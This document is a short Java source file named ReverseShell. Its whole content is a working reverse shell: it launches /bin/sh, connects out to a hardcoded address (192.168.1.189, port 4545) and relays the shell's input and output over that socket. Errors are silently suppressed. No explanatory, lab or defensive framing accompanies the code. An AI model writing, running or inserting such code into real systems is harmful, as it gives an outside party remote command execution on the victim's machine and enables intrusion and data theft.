import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ReverseShell {

    public static void main(String[] args) {

        try {

            String    host = "192.168.1.189";
            int       port = 4545;
            String command = "/bin/sh";
    
            Process proccess = new ProcessBuilder(command).redirectErrorStream(true).start();
            Socket socket = new Socket(host, port);
    
            InputStream proccessInputStream = proccess.getInputStream();
            InputStream proccessErrorStream = proccess.getErrorStream();
            InputStream socketInputStream = socket.getInputStream();
            
            OutputStream proccessOutputStream = proccess.getOutputStream();
            OutputStream socketOutputStream = socket.getOutputStream();
            
            while(!socket.isClosed()) {
                
                while(proccessInputStream.available() > 0)
                    socketOutputStream.write(proccessInputStream.read());
                
                while(proccessErrorStream.available() > 0)
                    socketOutputStream.write(proccessErrorStream.read());
                
                while(socketInputStream.available() > 0)
                    proccessOutputStream.write(socketInputStream.read());
                
                socketOutputStream.flush();
                proccessOutputStream.flush();
                
                Thread.sleep(50);
                try {
                    proccess.exitValue();
                    break;
                } catch (Exception e) {}
            };
    
            proccess.destroy();
            socket.close();

        } catch (Exception e) {}
    }
}
